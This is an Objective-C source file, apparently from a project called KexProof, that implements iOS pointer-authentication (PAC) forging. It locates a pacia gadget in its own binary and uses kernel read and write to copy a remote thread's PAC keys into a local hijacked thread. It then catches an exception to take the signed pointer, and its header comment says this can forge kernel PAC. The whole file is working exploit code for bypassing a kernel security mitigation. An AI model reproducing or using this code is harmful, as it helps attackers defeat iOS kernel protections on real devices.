// pac.m — PAC forging port (lara pac.m) for KexProof.
// remotepac: hijack a local thread, swap its PAC keys for the remote thread's
// keys (via kernel write), run a pacia gadget — yields a signature valid for
// the remote process. With kernel_task's keys this forges kernel PAC.
#import "pac.h"
#import "rc.h"
#import "KPDump.h"
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <pthread.h>
#import <mach/mach.h>
#import <string.h>
#import <stdlib.h>

extern mach_port_t mach_task_self_;

static uint64_t g_rc_paciagadget = 0;

uint64_t kp_pac_nativestrip(uint64_t address)
{
    return address & 0x7fffffffffULL;
}

uint64_t kp_pacia(uint64_t ptr, uint64_t modifier)
{
    uint64_t val = kp_pac_nativestrip(ptr);
    __asm__ volatile (
        "mov x16, %[ptr]\n"
        "mov x17, %[mod]\n"
        ".long 0xDAC10230\n"   // pacia x16, x17
        "mov %[out], x16\n"
        : [out] "=r"(val)
        : [ptr] "r"(val), [mod] "r"(modifier)
        : "x16", "x17"
    );
    return val;
}

uint64_t kp_ptrauthstrdisc(const char *name)
{
    if (strcmp(name, "pc") == 0) return 0x7481000000000000ULL;
    if (strcmp(name, "lr") == 0) return 0x77d3000000000000ULL;
    if (strcmp(name, "sp") == 0) return 0xcbed000000000000ULL;
    if (strcmp(name, "fp") == 0) return 0x4517000000000000ULL;
    return 0;
}

bool kp_pacsignworks(void)
{
    void *pcSymbol = dlsym(RTLD_DEFAULT, "getpid");
    if (!pcSymbol) pcSymbol = (void *)&kp_pacsignworks;
    uint64_t pcprobe = kp_pac_nativestrip((uint64_t)pcSymbol);
    uint64_t pcsigned = kp_pacia(pcprobe, kp_ptrauthstrdisc("pc"));
    return pcsigned != pcprobe;
}

uint64_t kp_findpacia(void)
{
    const uint32_t gadgetopcodes[] = {
        0xDAC10230,   // pacia x16, x17
        0xAA1003E0,   // mov x0, x16
        0xD65F03C0    // ret
    };
    // scan our own executable for the pacia+mov+ret gadget
    extern int _dyld_image_count(void);
    extern const char *_dyld_get_image_name(unsigned);
    extern const void *_dyld_get_image_header(unsigned);
    for (unsigned i = 0; i < (unsigned)_dyld_image_count(); i++) {
        const char *name = _dyld_get_image_name(i);
        if (!name || !strstr(name, "KexProof")) continue;
        uint8_t *base = (uint8_t *)_dyld_get_image_header(i);
        if (!base) continue;
        for (size_t off = 0; off + sizeof(gadgetopcodes) <= 0x200000; off += 4) {
            if (memcmp(base + off, gadgetopcodes, sizeof(gadgetopcodes)) == 0)
                return (uint64_t)(base + off);
        }
    }
    return 0;
}

// exception port helpers (exc.m port)
mach_port_t kp_createexcport(void);
bool kp_waitexc(mach_port_t excport, kp_excmsg *excbuf, int timeout);
bool kp_statereply(kp_excmsg *exc, kp_arm_thread_state64_internal *state);

// thread helpers (thread.m port)
bool kp_threadsetstate(mach_port_t machthread, kp_arm_thread_state64_internal *state);
void kp_threadsetpac(uint64_t threadaddr, uint64_t keya, uint64_t keyb);

static void kp_paccleanup(mach_port_t pacthread, mach_port_t excport, void *stack)
{
    if (pacthread != MACH_PORT_NULL) thread_terminate(pacthread);
    if (excport != MACH_PORT_NULL) mach_port_destruct(mach_task_self_, excport, 0, 0);
    if (stack) free(stack);
}

uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modifier)
{
    if (!g_rc_paciagadget) {
        uint64_t gadgetaddr = kp_findpacia();
        if (gadgetaddr == 0) return (uint64_t)-1;
        g_rc_paciagadget = gadgetaddr;
    }

    address = kp_pac_nativestrip(address);

    uint64_t keya = kp_rc_kread64(remotethreadaddr + KP_OFF_THREAD_MACHINE_ROP_PID);
    uint64_t keyb = kp_rc_kread64(remotethreadaddr + KP_OFF_THREAD_MACHINE_JOP_PID);

    mach_port_t pacthread = MACH_PORT_NULL;
    kern_return_t kr = thread_create(mach_task_self_, &pacthread);
    if (kr != KERN_SUCCESS) return (uint64_t)-1;

    void *stack = malloc(0x4000);
    memset(stack, 0, 0x4000);
    uint64_t sp = (uint64_t)(uintptr_t)stack + 0x2000;

    kp_arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    state.__sp = sp;
    state.__pc = kp_pacia(g_rc_paciagadget, kp_ptrauthstrdisc("pc"));
    state.__lr = kp_pacia(KP_FAKE_LR, kp_ptrauthstrdisc("lr"));
    state.__x[0]  = 0;
    state.__x[1]  = address;
    state.__x[2]  = modifier;
    state.__x[3]  = (uint64_t)pacthread;
    state.__x[16] = address;
    state.__x[17] = modifier;

    mach_port_t excport = kp_createexcport();
    if (!excport) { kp_paccleanup(pacthread, MACH_PORT_NULL, stack); return 0; }

    kr = thread_set_exception_ports(pacthread, EXC_MASK_BAD_ACCESS, excport, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    if (kr != KERN_SUCCESS) { kp_paccleanup(pacthread, excport, stack); return 0; }

    if (!kp_threadsetstate(pacthread, &state)) {
        kp_paccleanup(pacthread, excport, stack);
        return 0;
    }

    // swap pacthread's PAC keys for the remote thread's keys: resolve its
    // kernel thread_t VA through our own ipc table, then write keys there.
    uint64_t pacKVA = [KPDump rcResolveThreadKVA:pacthread];
    if (!pacKVA) { kp_paccleanup(pacthread, excport, stack); return 0; }
    kp_threadsetpac(pacKVA, keya, keyb);

    kr = thread_resume(pacthread);
    if (kr != KERN_SUCCESS) { kp_paccleanup(pacthread, excport, stack); return 0; }

    kp_excmsg exc;
    memset(&exc, 0, sizeof(exc));
    if (!kp_waitexc(excport, &exc, 100)) {
        kp_paccleanup(pacthread, excport, stack);
        return 0;
    }

    uint64_t signedAddress = exc.threadState.__x[16];
    kp_paccleanup(pacthread, excport, stack);
    return signedAddress;
}
